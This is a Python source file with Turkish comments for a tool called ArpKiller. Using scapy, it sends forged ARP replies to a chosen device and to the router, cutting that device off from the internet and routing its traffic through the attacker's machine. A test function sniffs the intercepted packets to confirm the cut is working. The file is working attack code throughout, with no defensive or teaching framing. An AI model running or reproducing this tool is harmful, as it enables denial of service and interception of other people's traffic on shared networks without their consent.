import os
import socket
import subprocess
import sys
import threading
import time

from scapy.all import ARP, Ether, get_if_hwaddr, getmacbyip, sendp
from scapy.config import conf


class ArpKiller:
    """
    ARP spoofing ile hedef cihazin internetini keser.
    Hem hedefe hem de modeme sahte ARP cevaplari gonderir; iki taraf da
    birbirine ulasmak yerine bizim MAC adresimize paket gonderir. Windows
    paket yonlendirmedigi icin trafik bizde biter ve hedefin interneti kesilir.
    """

    BROADCAST_INTERVAL = 2.0

    def __init__(self, target_ip: str, target_mac: str):
        self.target_ip = target_ip
        self.target_mac = target_mac.replace("-", ":").lower()
        self.iface, self.my_ip, self.gateway_ip = conf.route.route("8.8.8.8")
        self.my_mac = get_if_hwaddr(self.iface).lower()
        self.gateway_mac = (getmacbyip(self.gateway_ip) or "").lower()
        self.running = False
        self.started_at = None
        self._thread = None
        self._stop_event = threading.Event()

    @property
    def ready(self) -> bool:
        return bool(self.target_mac and self.gateway_mac)

    def start(self) -> None:
        if not self.ready:
            raise RuntimeError(
                f"MAC adresleri cozumlenemedi (hedef={self.target_mac}, gateway={self.gateway_mac})"
            )
        self._stop_event.clear()
        self.running = True
        self.started_at = time.time()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def _loop(self) -> None:
        while not self._stop_event.is_set():
            try:
                self._broadcast_fake_arp()
            except Exception as exc:
                print(f"[!] {self.target_ip}: ARP gonderme hatasi - {exc}")
            self._stop_event.wait(self.BROADCAST_INTERVAL)

    def _broadcast_fake_arp(self) -> None:
        to_target = (
            Ether(dst=self.target_mac)
            / ARP(
                op=2,
                pdst=self.target_ip,
                hwdst=self.target_mac,
                psrc=self.gateway_ip,
                hwsrc=self.my_mac,
            )
        )
        to_gateway = (
            Ether(dst=self.gateway_mac)
            / ARP(
                op=2,
                pdst=self.gateway_ip,
                hwdst=self.gateway_mac,
                psrc=self.target_ip,
                hwsrc=self.my_mac,
            )
        )
        sendp(to_target, iface=self.iface, verbose=False)
        sendp(to_gateway, iface=self.iface, verbose=False)

    def stop(self, restore: bool = True) -> None:
        self._stop_event.set()
        self.running = False
        if self._thread:
            self._thread.join(timeout=5)
        if restore:
            try:
                self._restore_arp()
            except Exception as exc:
                print(f"[!] {self.target_ip}: ARP geri yukleme hatasi - {exc}")

    def _restore_arp(self) -> None:
        fix_target = (
            Ether(dst=self.target_mac)
            / ARP(
                op=2,
                pdst=self.target_ip,
                hwdst=self.target_mac,
                psrc=self.gateway_ip,
                hwsrc=self.gateway_mac,
            )
        )
        fix_gateway = (
            Ether(dst=self.gateway_mac)
            / ARP(
                op=2,
                pdst=self.gateway_ip,
                hwdst=self.gateway_mac,
                psrc=self.target_ip,
                hwsrc=self.target_mac,
            )
        )
        for _ in range(6):
            sendp(fix_target, iface=self.iface, verbose=False)
            sendp(fix_gateway, iface=self.iface, verbose=False)
            time.sleep(0.25)


def gateway_route():
    """(iface, benim_ip, gateway_ip) dondurur."""
    return conf.route.route("8.8.8.8")


def check_environment() -> list:
    """Calisma ortamini kontrol eder, sorun listesi dondurur."""
    problems = []
    try:
        import scapy.all  # noqa: F401
    except ImportError:
        problems.append("scapy kurulu degil: pip install scapy")

    try:
        import netaddr  # noqa: F401
    except ImportError:
        problems.append("netaddr kurulu degil: pip install netaddr")

    try:
        import cryptography  # noqa: F401
    except ImportError:
        problems.append("cryptography kurulu degil: pip install cryptography")

    if os.name == "nt":
        if not os.path.exists(r"C:\Windows\System32\Npcap\wpcap.dll"):
            problems.append("Npcap kurulu degil: https://npcap.com adresinden indirip kurun")
    return problems


def warn_if_no_root() -> bool:
    """Root/admin yoksa uyari basar; spoilera duyarli islemler icin False dondurur."""
    if is_admin():
        return True
    if os.name == "nt":
        print("[!] Yonetici yetkisi yok - ARP spoofing calismaz. Programi UAC ile baslatin.")
    else:
        print("[!] Root yetkisi yok - ARP spoofing (kesme/yonlendirme) calismaz.")
        print("    Sadece tarama ve trafik izleme (pasif) kullanilabilir.")
        print("    Root ile:  su -c 'python main.py'")
    return False


def is_admin() -> bool:
    """Windows'ta admin, Linux/Termux'ta root (uid 0) olup olmadigini dondurur."""
    try:
        if os.name == "nt":
            import ctypes

            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        return os.geteuid() == 0
    except Exception:
        return False


def get_ping_flags(ip: str, count: int = 1, timeout_ms: int = 1000) -> list:
    """Platforma gore uygun ping komut bayraklarini dondurur."""
    if os.name == "nt":
        return ["ping", "-n", str(count), "-w", str(timeout_ms), ip]
    return ["ping", "-c", str(count), "-W", str(max(1, timeout_ms // 1000)), ip]


def test_kill(target_ip: str, duration: int = 8) -> dict:
    """
    Kesintinin gercekten calisip calismadigini test eder.

    Mantik: Spoofing aktifse hedefin internete giden paketleri artik
    modemin degil BIZIM MAC adresimize gelir. Bu paketleri yakalarsak,
    trafik bizden geciyor ve olduriliyor demektir -> internet KESIK.

    Dönen sözlük:
      lan_alive    -> cihaz yerel agda hala ulasilabilir mi (ping)
      intercepted  -> hedefin internet paketleri bizim uzerimizden akiyor mu
    """
    import subprocess

    from scapy.all import sniff

    iface = conf.route.route("8.8.8.8")[0]
    my_mac = get_if_hwaddr(iface).lower()

    ping = subprocess.run(
        get_ping_flags(target_ip, count=1, timeout_ms=1000),
        capture_output=True,
    )
    lan_alive = ping.returncode == 0

    intercepted = {"count": 0}

    def _count(pkt):
        intercepted["count"] += 1

    from scanner import get_prefix_length

    my_ip = conf.route.route("8.8.8.8")[1]
    prefix = get_prefix_length(my_ip)
    flt = (
        f"ether dst {my_mac} and ip src {target_ip} "
        f"and not dst net {'.'.join(my_ip.split('.')[:3])}.0/{prefix}"
    )
    try:
        sniff(
            iface=iface,
            filter=flt,
            timeout=duration,
            prn=_count,
            store=False,
        )
    except Exception as exc:
        print(f"[!] Dinleme hatasi: {exc}")

    return {
        "lan_alive": lan_alive,
        "intercepted": intercepted["count"] > 0,
        "packet_count": intercepted["count"],
        "duration": duration,
    }
